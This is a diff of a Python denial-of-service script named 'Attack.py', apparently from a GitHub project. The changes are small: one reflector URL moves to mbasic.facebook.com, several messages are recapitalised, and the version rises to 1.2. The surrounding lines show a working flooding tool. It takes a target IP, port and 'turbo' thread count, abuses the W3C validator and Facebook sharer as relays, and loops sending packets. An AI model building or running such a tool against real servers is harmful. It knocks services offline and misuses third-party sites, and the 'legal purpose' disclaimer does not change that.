@@ -27,7 +27,7 @@ def my_bots():
 	global bots
 	bots=[]
 	bots.append("http://validator.w3.org/check?uri=")
-	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://mbasic.facebook.com/sharer/sharer.php?u=")
 	return(bots)
 
 
@@ -52,10 +52,10 @@ def down_it(item):
 				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m» Packets Sent!\033[0m")
 			else:
 				s.shutdown(1)
-				print("\033[91mshut<->down\033[0m")
+				print("\033[91mSHUT<->DOWN\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91m no connection! server maybe down\033[0m")
+		print("\033[91m No Connection! Server Maybe Down\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -78,16 +78,16 @@ def usage():
 	print (''' \033[92m	
 	╦  ┬ ┬┌─┐┬┌┬┐┌─┐  ╔╦╗╔╦╗┌─┐╔═╗
 	║  │ ││  │ │ ├─┤   ║║ ║║│ │╚═╗
-	╩═╝└─┘└─┘┴ ┴ ┴ ┴  ═╩╝═╩╝└─┘╚═╝v1.0
+	╩═╝└─┘└─┘┴ ┴ ┴ ┴  ═╩╝═╩╝└─┘╚═╝v1.2
 	✓Only for legal purpose
 	Author by @Henrycko
         Supporters by @Dzakira Alzena Daiva
 	Github: https://github.com/Henrycko\n
 	Usage : python3 Attack.py [-s] [-p] [-t]	
-	-h : Help
-	-s : IP Address
-	-p : Port Number
-	-t : Turbo default 135 \033[0m''')
+	-h : HELP
+	-s : IP ADDRESS
+	-p : PORT
+	-t : TURBO DEFAULT 135 \033[0m''')
 	sys.exit()
 
 	
@@ -144,7 +144,7 @@ if __name__ == '__main__':
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
-		print("\033[91mcheck server IP and port\033[0m")
+		print("\033[91mCheck server IP and PORT\033[0m")
 		usage()
 	while True:
 		for i in range(int(thr)):
